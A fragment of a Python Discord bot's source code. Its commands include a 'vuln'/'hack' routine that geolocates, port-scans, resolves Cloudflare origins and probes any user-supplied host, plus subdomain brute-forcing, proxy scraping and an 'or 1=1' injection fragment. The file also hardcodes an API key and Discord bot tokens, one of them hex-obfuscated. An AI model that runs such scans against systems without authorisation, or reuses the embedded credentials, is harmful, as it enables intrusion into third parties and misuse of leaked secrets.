            if re_is_valid == True:
                re_is_valid_char = "YES"
            elif re_is_valid == False:
                re_is_valid_char = "NO"
            load=str(strings.strip_1+re_is_valid_char+strings.strip_2+re_num+strings.strip_3+re_local_fmt+strings.strip_4+re_int_fmt+strings.strip_5)
            load2=str(re_country_prfx+strings.strip_6+re_country_code+strings.strip_7+re_country_name+strings.strip_8+re_location+strings.strip_9+re_line_type+strings.strip_10+re_carrier+strings.strip_11)
            await message.channel.send(str("**Phone Number Lookup For "+re_num+"/"+re_carrier+":**\n```yaml\n"+load+load2+"\n```\n>*Requested By* **"+str(message.author)+"**.<"))
        except Exception as ErE:
            #await message.channel.send("Debug: \n"+str(ErE))
            await message.channel.send("Error - Foreign Number Could Not Be Resolved!!!")
    if message.content.startswith('at.hack'):
        await message.channel.send("""
```diff
-Feature Unavailable For Now!
```
""")
    if message.content.startswith('at.og.hack') or message.content.startswith('at.vuln') or message.content.startswith('at.baby.vuln'):
                moop = message.content.split();tar = str(moop[1])
                await message.channel.send(f"**Hacking {tar}... ;)\n**")
                try:
                    re=requests.get('https://json.geoiplookup.io/' + tar)
                    data=re.json();re_ip = data['ip'];re_isp = data['isp'];re_org = data['org'];re_hostname = data['hostname'];re_city = data['city']
                    re_country = data['country_name'];re_asn = data['asn'];re_integ = data['success'];re_is_cached = data['cached'];re_curr = data['currency_code']
                    if re_is_cached == True: integ_char = 'True'
                    elif re_is_cached == False: integ_char = 'False'
                    if re_is_cached == True: cache_char = 'True'
                    elif re_is_cached == False: cache_char = 'False'
                    goods=str("""

                    *Getting Things Together For Your Testing....*

                    ```yaml
        ||Lixxard Bot Geo - Ip Lookup||

        Results For """+re_hostname+""":


        IP: """ + re_ip + """

        ISP: """ + re_isp + """

        ORG: """ + re_org + """

        HOSTNAME: """ + re_hostname + """

        CITY: """ + re_city + """

        COUNTRY: """ + re_country + """

        ASN: """ + re_asn + """

        SUCCESS: """ + integ_char + """

        CACHED: """ + cache_char + """

        CURRENCY: """ + re_curr + """

        INFO: Coming Soon!
                    ```
                    """+"\n*Requested By* **"+str(message.author)+"**.")
                except Exception:
                    await message.channel.send("Error! - Invalid Host...")
                try:
                    await message.channel.send(goods)
                except Exception: pass
                await message.channel.send(f"**Attempting To Resolve {tar}...**")
                url22 = ('https://webresolver.nl/api.php?'
                'key=7JWS0-JJ5ZY-DK613-2PHB7&json&'
                f'action=cloudflare&string={tar}')
                response1 = requests.get(url22)
                r1 = response1.json()
                success1 = r1['success']
                if success1 == True:
                    old_stdout11 = sys.stdout
                    result11 = StringIO()
                    sys.stdout = result11
                    for r1['domain'] in r1['domains']:
                        print(str(r1['domain']))
                        print()
                    yeet = str(result11.getvalue())    
                    await message.channel.send(f"**Cloudflare Resolver**\n**Resolved Addresses For **{tar}:\n```yaml\n{yeet}\n```\n")
                elif success1 != True:
                    await message.channel.send("*No Cloudflare Aliases Found, Moving On...*")  
                await message.channel.send(f"**Scanning Open Ports For {tar}...**")
                link12 = str(f'https://api.hackertarget.com/nmap/?q={tar}')
                rd1 = requests.get(link12)
                await message.channel.send("```yaml\n"+rd1.text+"\n```\n*Ok* **"+str(message.author)+"**!\n**Now Attempting http/https Vulns.!**\n")
                try:
                    user_agent0 = choice(lists.useragents)
                    headers0 = {'User-Agent' : user_agent0}
                    url0=f"http://{tar}/js/"
                    t1 = requests.get(url0,headers=headers0)
                    got=t1.text
                    await message.channel.send(f"**HTTP Check:**\n```html\n"+got+"\n```\n**Our User-Agent:** *"+str(user_agent0)+"*")
                except Exception as jfdh:
                    log.log(str(jfdh))
                    await message.channel.send(f"**Failed Dump-Attempt @ http://{tar}/js/**\n**Our User-Agent:** *"+str(user_agent0)+"*")
                    pass
                try:
                    user_agent1 = choice(lists.useragents)
                    headers1 = {'User-Agent' : user_agent1}
                    url1=f"https://{tar}/js/"
                    t2 = requests.get(url1,headers=headers1)
                    got1=t2.text
                    await message.channel.send(f"**HTTPS Check:**\n```html\n"+got1+"\n```\n**Our User-Agent:** *"+str(user_agent1)+"*")
                except Exception as lkjf:
                    log.log(str(lkjf))
                    await message.channel.send(f"Failed Dump-Attempt @ https://{tar}/['/?=1/or 1=1/?/html/bridge.html/auth0]\n**Our User-Agent:** *"+str(user_agent1)+"*")
                    pass
                await message.channel.send(f"\n**Possible Vuln @ http://{tar}/js/**\n**Possible Vuln @ https://{tar}/js/**")
                await message.channel.send("\n**Sweeping "+tar+", brb...**")
                myurl = ('https://webresolver.nl/api.php?'
                         'key=7JWS0-JJ5ZY-DK613-2PHB7&'
                         'html=0&'
                         'action=header&string='+str(tar))
                loadboi = requests.get(myurl)
                jboi=loadboi.text
                await message.channel.send(str(f'**Header Sweep For **{tar}\n```yaml\n{jboi}\n```\n')+str(f'\n\n**Standard Vulnerability Test Complete For {tar}!**\n*Requested By* **'+str(message.author)+"**."));time.sleep(1)




    if message.content.startswith('at.ascii'):
        cont = True
        query = message.content.replace(f"{message.content.split()[0]} ", "")
        try:
            r = requests.get(f"http://artii.herokuapp.com/make?text={query}")
        except Exception as f:
            cont = False
            await message.channel.send('Failed To Reach The API! Somethings broken, omg!!!!')
        if cont == True:
            this = f"""
```

{r.text}

```

"""
            strlen = len(this)
            if strlen < 2499:
                await message.channel.send(this)
            else:
                await message.channel.send(f"Too many characters! | Your ASCII Art was {strlen}/2500 characters after completion X(.\nPlease try again with less characters at a time! Typically accepts 1-4 words.*")
                
        





                
    #at.proxies socks5            
#at.proxies https://api.proxyscrape.com/?request=getproxies&proxytype=socks5&timeout=7200&country=all
    if message.content.startswith('at.list') or message.content.startswith('at.proxies'):
        alist = message.content.split()
        bEE = False
        try:
            proxy_type = str(alist[1])
            proxy_timeout = str(alist[2])
            proxy_country = str(alist[3])
        except Exception as EEEE:
            #log.log(str(f"Debug\n```python\n{str(EEEE)}\n```\n"))
            await message.channel.send(str(f"Debug\n```python\n{str(EEEE)}\n```\n"))
            #(f"'**Correct Usage:** `at.proxies <proxytype> <timeout> <country>` - Get Proxy List\n**Use at.proxy.help For More Info.**\n{outt}")
            bEE = True
            pass
        if bEE == False:
            try:
                usr_string = f"https://api.proxyscrape.com/?request=getproxies&proxytype={proxy_type}&timeout={proxy_timeout}&country={proxy_country}"
                shneef = requests.get(usr_string, allow_redirects=True, headers=user_agent.get_headers())
                log.log(shneef.text)
            except Exception as Ere:
                await message.channel.send(str(f"Debug\n```python\n{str(Ere)}\n```\n"))
                bEE == True
                
        if bEE == False:
            try:
                await message.channel.send(shneef.text)
            except Exception:
                pass

    if message.content.startswith('at.spider'):
        host = message.content.split()[1]
        host = host.lower()
        if "www" in host:
            await message.channel.send("""**"www" is not a valid TLD, pal!\nYou should leave that out next time but i'm fixing that for you now! ;)**""")
            host = host.replace('www.', '')
        subdomainlist = open("aero-data/data/subdomains.txt").read().splitlines()
        await message.channel.send(f'**:spider:<@{message.author.id}> I Sent You A DM!**')
        await message.author.send(f'**:spider: <@{message.author.id}>Beginning Spidering Session @ {host}...\nI Will Return Soon!:spider_web:\n'
                                  'https://cdn.discordapp.com/attachments/635539301790384171/645477466823196723/giphy.gif\n-**')
        sleep(8)
        count__ = 0
        for sublist in subdomainlist:
            try:
                hosts = str(sublist) + "." + str(host)
                showip = socket.gethostbyname(str(hosts))
                await message.author.send(f"**Found: `{str(showip)}` --> `{str(hosts)}` - [`#{count__}`]**")
                count__ += 1
            except:
                        pass
        await message.author.send(f'**:spider:<@{message.author.id}> Done!:spider_web:**')            
        await message.channel.send(f'**:spider:<@{message.author.id}> Successfully Spidered `{count__}` Subdomains Belonging To {host}!:spider_web:**')            
                    

            
    if message.content.startswith('at.screenshot'):
        gass=message.content.split()
        uurl = str(gass[1])
        uurl = uurl.replace("https://", "").replace("http://","")

    if message.content.startswith('at.push'):
        if message.author.id == 632636197784649758:
            cmd = message.content.split()[1]
            channel = client.get_channel(message.channel.id)
            requests_b4 = len(client.cached_messages)
            latency_b4 = round(float(client.latency), 6)
            end_b4 = str(client.ws)
            if cmd == "reset()":
                await channel.send('Ok, going down for a refresh!')
                await client.clear()
                client.run(bytes.fromhex('4e5467304d4459794e5463784d4449774d6a67344d444d772e5854794376772e4751716a5933576744314c384f36334b526a4a583341505a333677').decode('utf-8'))
                requests_after = len(client.cached_messages)
                latency_after = round(float(client.latency), 6)
                latency_diff = round(float(latency_b4 - latency_after), 4)
                end_after = str(client.ws)
                await channel.send(bold(f"""
Client Refreshed Successfully!
__Stats:__
Before Refresh:
```diff
-Cached Messages:
{requests_b4}
-Latency:
{latency_b4}
-Endpoint:
{end_b4}
```
After Refresh:
```yaml
-Cached Messages:
{requests_after}
-Latency:
{latency_after}
-Endpoint:
{end_after}
```
Difference:
```css
-Latency Differential:
{latency_diff}
```
"""))
            if cmd == "maint_rp":
                activity = discord.Activity(name="UNDER ROUTINE MAINTAINANCE! *MAY GET 2 REPLIES OR NONE!*", type=discord.ActivityType.watching)
                await client.change_presence(activity=activity)
                await message.channel.send(bold("RP SET WITH SUCCESS: <Under Maintainance Message>"))

            if cmd == "default_rp":
                activity = discord.Activity(name="at.help | aero-bot.pro/aerotools.html", type=discord.ActivityType.playing)
                await client.change_presence(activity=activity)
                await message.channel.send(bold("RP SET WITH SUCCESS: <Regular Message>"))
                
            if cmd == "custom_rp":
                thing = message.content.replace(f"{message.content.split()[0]} {cmd} ", "")
                activity = discord.Activity(name=thing+" | aero-bot.pro/aerotools.html", type=discord.ActivityType.playing)
                await client.change_presence(activity=activity)
                await message.channel.send(bold("RP SET WITH SUCCESS: <`{thing} | aero-bot.pro/aerotools.html`>"))

            if cmd == "help":
                user = client.get_user(632636197784649758)
                await user.send("""
at.push->maint_rp->default_rp->custom_rp-> 
""")
                

            else:
                await channel.send(bold_u(f"```diff\n-Unknown Command!\n```"))
                
        
                
                
### Text Bold/Italic FORMAT

def bold_u(thing):#
    stuff = str(f"**__{thing}__**")
    return stuff

def bold(thing):#
    stuff = str(f"**{thing}**")
    return stuff

def italic(thing):
    stuff = str(f"*{thing}*")
    return stuff

def css(thing):
    stuff = str(f"```css\n{thing}```")
    return stuff
############################################



def is_premium(idd):
    try:
            
        premium = False
        with open("aero-data/premiums.txt", "r") as stuff:
            text = stuff.read()
            if str(str(idd)) in text:
                premium = True
            elif str(str(idd)) not in text:
                premium = False
            else:
                premium = None
        return premium
    except Exception as dfsa:
        log.log(f"{str(dfsa)}\n\n--\n FATAL ERROR @ is_premium event!")
        
def add_premium(idd):
    try:   
        with open("aero-data/premiums.txt", "r") as stuff:
            text = stuff.read()
            text = str("\n"+str(idd)+text)
        remove("aero-data/premiums.txt")     
        with open("aero-data/swap_", "w+") as nu:
            nu.write(text)
        rename("aero-data/swap_", "aero-data/premiums.txt")    
    except Exception as afdd:
        log.log(f"{str(afdd)}\n\n--\n FATAL ERROR @ add_premium event!")
        
def remove_premium(idd):
    try:
        with open("aero-data/premiums.txt", "r") as stuff:
            text = stuff.read()
            text = text.replace("\n"+str(idd), "")
        remove("aero-data/premiums.txt")     
        with open("aero-data/swap_", "w+") as nu:
            nu.write(text)
        rename("aero-data/swap_", "aero-data/premiums.txt")            
    except Exception as sdfg:
        log.log(f"{str(sdfg)}\n\n--\n FATAL ERROR @ remove_premium event!")
        
        
        
    
            
class limiter:
    def run(filename):
        filename = str(filename)
        with open(filename, "rt") as swap:
            _ = swap.read()
        return filename
    
    def append_stack(idd):
        idd = str(int(idd))
        with open(file, "a") as append:
            append.write(idd)

    def pop_stack(idd):
        idd = str(int(idd))
        with open(file, "r") as stack:
            this = str(stack.read())
            that = this.replace(idd, "")
        with open(f"aero-data/file_tmp", "w") as nu:
            nu.write(that)
        try:
            remove(file)
            rename("aero-data/file_tmp", file)
        except Exception:
            print('Failed To Write New File!')

    def check_stack_for_user(idd):
        idd = str(int(idd))
        user_in_stack = False
        with open(file) as stack:
            check = stack.read()
            if idd in check: user_in_stack = True
            else: user_in_stack = False
        return user_in_stack        

file = limiter.run("aero-data/user_swap")                
limiting = False

def limit_user(idd):
    idd = int(idd)
    limiter.append_stack(idd)

    
def allow_user(idd):
    idd = int(idd)
    limiter.pop_stack(idd)
def is_user_limited(idd):
    idd = int(idd)
    return bool(limiter.check_stack_for_user(idd))
def set_limiter(idd):
    global limiting
    limit_user(idd)
    timer = time.time() + 60  # 1 minute/s from now
    while True:
        limiting = True
        if time.time() > timer:
            break
    allow_user(idd)
    limiting = False

def no_perms_alert(author, event):
    author = str(author)
    event = str(author)
    message = bold(f"```diff\n-Warning!\n```\n\n`{author}`, you don't have permission to `{event}`!")
    return message

def correct_usage_alert(author, usage):
    string = bold(f"```diff\n-Error!\n```\n`{author}`, __Correct Usage:__`{usage}`!")
    return string

def success_alert(author, event):
    string = bold(f"```yaml\nSuccess!\n```\n{author} `{event}` successfully!")
    return string

def error_format(author, error):
    string = bold(f"```diff\n-Error!\n```\n`{author}`, `{error}`")
    return string     


class user_agent:
    def get_headers():
        useragents = [
        ('Mozilla/5.0 (X11; Linux x86_64) '
         'AppleWebKit/537.36 (KHTML, like Gecko) '
         'Chrome/57.0.2987.110 '
         'Safari/537.36'),  # chrome
        ('Mozilla/5.0 (X11; Linux x86_64) '
         'AppleWebKit/537.36 (KHTML, like Gecko) '
         'Chrome/61.0.3163.79 '
         'Safari/537.36'),  # chrome
        ('Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) '
         'Gecko/20100101 '
         'Firefox/55.0'),  # firefox
        ('Mozilla/5.0 (X11; Linux x86_64) '
         'AppleWebKit/537.36 (KHTML, like Gecko) '
         'Chrome/61.0.3163.91 '
         'Safari/537.36'),  # chrome
        ('Mozilla/5.0 (X11; Linux x86_64) '
         'AppleWebKit/537.36 (KHTML, like Gecko) '
         'Chrome/62.0.3202.89 '
         'Safari/537.36'),  # chrome
        ('Mozilla/5.0 (X11; Linux x86_64) '
         'AppleWebKit/537.36 (KHTML, like Gecko) '
         'Chrome/63.0.3239.108 '
         'Safari/537.36'),  # chrome
        ]
        user_agent = choice(useragents)
        headers = {'User-Agent' : user_agent}
        return headers

class nu_lists:
    fortune_cookies = [
        "https://static.boredpanda.com/blog/wp-content/uploads/2018/02/funny-fortune-cookie-messages-fb18__700-png.jpg",
        "https://i.pinimg.com/originals/0b/6b/92/0b6b920059e411db0f3a0734ead972f5.jpg",
        "https://images2.minutemediacdn.com/image/upload/c_fill,g_auto,h_1248,w_2220/f_auto,q_auto,w_1100/v1555930181/shape/mentalfloss/5002313ignore_5.jpg",
        "https://cdn.ebaumsworld.com/picture/JackBruce/P71700021.JPG",
        "https://static.boredpanda.com/blog/wp-content/uploads/2018/02/funny-fortune-cookie-messages-20-5a784a89b4328__605.jpg",
        "https://cdn.lolwot.com/wp-content/uploads/2015/05/20-funny-fortune-cookie-sayings-to-crack-you-up-6.jpg",
        "http://madeinshoreditch.co.uk/wp-content/uploads/2014/10/36bc962a-ed48-4537-9162-8e7233b95e40.jpg",
        "https://images-production.freetls.fastly.net/uploads/photos/file/212025/funny-fortune-cookies-2.jpg?auto=compress&crop=top&fit=max&q=55&w=750",
        "https://images-production.freetls.fastly.net/uploads/photos/file/212022/funny-fortune-cookies-7.jpg?auto=compress&crop=top&fit=max&q=55&w=750",
        "https://images-production.freetls.fastly.net/uploads/photos/file/212021/funny-fortune-cookies-8.jpg?auto=compress&crop=top&fit=max&q=55&w=750",
        "https://images-production.freetls.fastly.net/uploads/photos/file/212019/funny-fortune-cookies-11.jpg?auto=compress&crop=top&fit=max&q=55&w=750",
        "https://images-production.freetls.fastly.net/uploads/photos/file/212023/funny-fortune-cookies-10.jpg?auto=compress&crop=top&fit=max&q=55&w=750",
        "https://images-production.freetls.fastly.net/uploads/photos/file/212028/funny-fortune-cookies-4.jpg?auto=compress&crop=top&fit=max&q=55&w=750",
        "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgFvDY1zgpB3Brtw5KJHkQA3pu64alciVneNUXDGQRokCRQP6TZw&s",
        "https://images-na.ssl-images-amazon.com/images/I/41TI5cYvPrL.jpg",
        "https://s7.orientaltrading.com/is/image/OrientalTrading/VIEWER_IMAGE_400/graduation-fortune-cookies~k505",
        "https://revitupreading.com/wp-content/uploads/2016/07/fortunecookie-1.png",
        "https://www.cerestalent.com/wp-content/uploads/2017/03/Fortune-Cookie-w-fortune-3.17.png",
        "https://images2.minutemediacdn.com/image/upload/c_fill,g_auto,h_1248,w_2220/f_auto,q_auto,w_1100/v1555387886/shape/mentalfloss/fortunecookiehed.png",
        "https://munchies-images.vice.com/wp_upload/fortune-cookies-chinese-new-year.jpg"
        ]
#try:
client.run('NjM1NTI3NDM1MTM5Njc4MjI4.XayYEg.mu6Zb8UZccr_eyIk9-R99waQuHw')#except Exception as efas:
#    log.log(str(efas))
#    print(str(efas))
